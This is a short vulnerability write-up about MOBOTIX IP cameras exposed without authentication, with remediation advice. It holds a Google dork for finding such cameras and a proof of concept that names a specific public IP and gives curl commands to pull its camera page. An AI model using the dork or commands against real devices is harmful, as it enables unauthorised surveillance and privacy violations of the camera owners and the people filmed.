## üìù Description

Multiple MOBOTIX IP cameras are publicly exposed on the internet and can be accessed directly via their IP addresses **without any authentication**. These systems allow anyone to view the camera interface and in some cases access live streams, snapshots, or even interact with PTZ functions.

This vulnerability is the result of misconfigured devices left accessible without enforcing login authentication, and is easily discoverable using a basic Google Dork.

---

## üîé Google Dork

```bash
intext:"¬© 2001-2025 MOBOTIX" -site:*.* -inurl:www
```

This Dork identifies IP-based publicly exposed MOBOTIX camera interfaces.

---

## üß™ Proof of Concept (PoC)

```bash
# Step 1: Search via Google Dork
# Result example: http://195.70.120.133/

# Step 2: Visit the IP in a browser
# The camera interface loads directly without requiring any authentication.

# Step 3: Capture the camera interface content using cURL
curl http://195.70.120.133/cgi-bin/guestimage.html

# Optional: Save the raw HTML content to a file
curl http://195.70.120.133/cgi-bin/guestimage.html --output snap.html
```

> üîê No login is required. The interface, image stream, or control elements are publicly accessible.

## ‚ö†Ô∏è Impact

- Unauthenticated access to live video feed
- In some cases, control over camera functions (pan/tilt/zoom)
- Violation of privacy laws and surveillance leakage

---

## üìå Recommendations

- Enforce HTTP basic authentication or token-based access
- Whitelist internal IPs or use VPN
- Remove public IP exposure and block access via firewall
- Regularly audit public-facing IoT devices

## ‚úÖ Status

This issue has been manually verified on multiple IPs. Dozens of exposed systems were accessible at the time of testing. The vulnerability stems from poor configuration, not a software flaw.
